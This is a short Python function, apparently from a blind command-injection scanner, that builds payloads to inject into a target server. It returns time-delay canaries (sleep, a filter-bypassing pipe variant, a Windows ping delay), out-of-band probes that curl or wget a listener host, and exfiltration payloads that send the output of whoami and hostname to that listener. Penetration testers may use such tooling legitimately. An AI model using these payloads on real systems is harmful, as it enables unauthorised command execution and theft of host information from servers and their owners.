def generate_payloads(lhost, lport):
    """
    Returns a list of tuples:  (payload_string, payload_type, expected_delay_secs)

    payload_type values:
      "time_based" — detection relies on response latency
      "oob"        — detection relies on a callback to our listener
    expected_delay_secs:
      For time_based payloads: the number of seconds the server should stall.
      For oob payloads: 0 (we wait for the queue instead).
    """
    return [
        # --- 1. TIME CANARIES ---
        # Linux: classic sleep
        ("; sleep 10 #",                       "time_based", 10),
        # Linux: pipe variant — bypasses simple ';' filters
        ("| sleep 10 #",                       "time_based", 10),
        # Windows: ping loopback ~10 times ≈ 10s delay
        ("& ping -n 11 127.0.0.1 > nul &",    "time_based", 10),

        # --- 2. OOB CONNECTIVITY PROBES ---
        # Basic HTTP hit — confirms curl/wget execution
        (f"; curl http://{lhost}:{lport}/HTTP_HIT #",              "oob", 0),
        # wget fallback for targets without curl
        (f"; wget -q -O /dev/null http://{lhost}:{lport}/WGET_HIT #", "oob", 0),

        # --- 3. DATA EXFILTRATION ---
        # whoami — returns the user the server process is running as
        (f"; curl http://{lhost}:{lport}/$(whoami) #",            "oob", 0),
        # hostname — returns the machine's hostname
        (f"; curl http://{lhost}:{lport}/$(hostname) #",          "oob", 0),
    ]